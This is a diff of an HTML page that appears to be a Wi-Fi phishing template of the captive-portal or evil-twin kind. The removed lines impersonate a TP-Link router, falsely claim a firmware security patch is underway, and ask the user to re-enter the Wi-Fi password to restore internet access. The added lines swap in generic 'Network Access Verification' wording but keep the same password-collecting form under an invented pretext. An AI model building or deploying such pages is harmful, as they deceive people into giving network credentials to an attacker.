@@ -1,103 +1,110 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>TP-Link Router Access</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    body {
-      font-family: "Segoe UI", "Open Sans", sans-serif;
-      background-color: #f4f7f9;
-      margin: 0;
-      padding: 0;
-    }
-
-    .header {
-      background-color: #3ab795;
-      color: white;
-      padding: 1rem 2rem;
-      font-size: 1.4rem;
-      font-weight: bold;
-    }
-
-    .content {
-      max-width: 500px;
-      background-color: white;
-      margin: 5vh auto;
-      padding: 2rem;
-      border-radius: 8px;
-      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
-    }
-
-    .status-box {
-      background-color: #eafaf5;
-      border: 1px solid #3ab795;
-      padding: 1rem;
-      border-radius: 4px;
-      margin-bottom: 1.5rem;
-      color: #333;
-    }
-
-    .status-box strong {
-      color: #3ab795;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 0.5rem;
-      font-weight: 600;
-    }
-
-    input[type="password"] {
-      width: 100%;
-      padding: 0.6rem;
-      font-size: 1rem;
-      margin-bottom: 1.5rem;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-
-    button {
-      width: 100%;
-      padding: 0.75rem;
-      font-size: 1rem;
-      background-color: #3ab795;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #329f83;
-    }
-
-    .footer {
-      text-align: center;
-      font-size: 0.8rem;
-      color: #999;
-      margin-top: 2rem;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Network Access Verification</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+  body {
+    margin: 0;
+    background-color: #f7f9fc;
+    font-family: 'Inter', sans-serif;
+    color: #2c3e50;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+  main {
+    flex-grow: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 1rem;
+  }
+  .container {
+    background: #ffffff;
+    padding: 2.5rem 3rem;
+    border-radius: 8px;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.1);
+    max-width: 400px;
+    width: 100%;
+  }
+  h1 {
+    font-weight: 600;
+    font-size: 1.5rem;
+    margin-bottom: 1rem;
+    color: #34495e;
+    text-align: center;
+  }
+  p.message {
+    font-size: 1rem;
+    color: #4a5568;
+    margin-bottom: 2rem;
+    text-align: center;
+    line-height: 1.4;
+  }
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+  label {
+    font-weight: 600;
+    margin-bottom: 0.5rem;
+    color: #34495e;
+    user-select: none;
+  }
+  input[type="password"] {
+    padding: 0.75rem 1rem;
+    font-size: 1rem;
+    border: 1.8px solid #cbd5e1;
+    border-radius: 6px;
+    transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+    outline-offset: 2px;
+    outline-color: transparent;
+  }
+  input[type="password"]:focus {
+    border-color: #2563eb;
+    box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.3);
+  }
+  button {
+    margin-top: 1.75rem;
+    padding: 0.85rem;
+    font-size: 1.1rem;
+    font-weight: 600;
+    color: #fff;
+    background-color: #2563eb;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: background-color 0.25s ease-in-out;
+  }
+  button:hover,
+  button:focus {
+    background-color: #1e40af;
+    outline: none;
+  }
+  footer {
+    text-align: center;
+    padding: 1rem 0;
+    font-size: 0.9rem;
+    color: #94a3b8;
+    user-select: none;
+  }
+</style>
 </head>
 <body>
-  <div class="header">TP-Link Wireless Router</div>
-
-  <div class="content">
-    <div class="status-box">
-      <strong>Firmware Update in Progress</strong><br />
-      Your router is currently finalizing a security patch. Internet access is paused until re-authentication is complete.
-    </div>
-
-    <form method="POST" action="/submit">
-      <label for="pwd">Wi-Fi Password</label>
-      <input type="password" name="password" id="pwd" required placeholder="Enter your password" />
+<main>
+  <div class="container" role="main" aria-label="Network Access Verification Form">
+    <h1>Network Access Verification</h1>
+    <p class="message">To complete recent network configuration updates, please verify your credentials.</p>
+    <form method="POST" action="#">
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" autocomplete="current-password" required autofocus />
       <button type="submit">Continue</button>
     </form>
-
-    <div class="footer">
-      © TP-Link Technologies Co., Ltd. All rights reserved.
-    </div>
   </div>
+</main>
+<footer>© 2025 Private Network Access.</footer>
 </body>
 </html>
